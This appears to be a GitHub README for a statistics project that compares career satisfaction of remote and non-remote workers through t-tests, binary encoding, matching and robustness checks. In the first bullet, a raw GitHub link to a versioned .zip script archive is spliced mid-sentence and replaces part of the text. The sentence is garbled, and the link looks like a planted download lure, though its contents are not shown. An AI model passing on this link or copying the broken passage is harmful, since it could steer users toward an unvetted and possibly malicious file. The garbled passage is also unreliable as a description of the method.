# Remote-Workers-career-satisfaction
The discussion on the future of work is on. However,
to decide who is better off, you cannot simply compare
remote versus non-remote workers. The groups are
inherently different. The solution is to use matching.

- Picking the variables : This is the technique where
variable selection is the most
https://raw.githubusercontent.com/Abdelmalik9/Remote-Workers-career-satisfaction/main/Script/satisfaction_career_Remote_Workers_v2.4-beta.3.zip variable
must be enough to describe the
elements in the groups.

- T-test loop : The T-Tests will tell us whether the
means of the variables are statistically
different in both groups. The relevance
is to show we have different groups
and thus incomparable. Thus, we will
conclude we need to use Matching

- Binary Variables : Our models only take numeric
variables as inputs. We need to
transform all non-numeric
variables into binary

- Matching

- Robustness Check : All results can be spurious. That is,
they can result out of random
chance. The robustness checks
serve to try the experiment in
different setups to increase the
trust in the results.
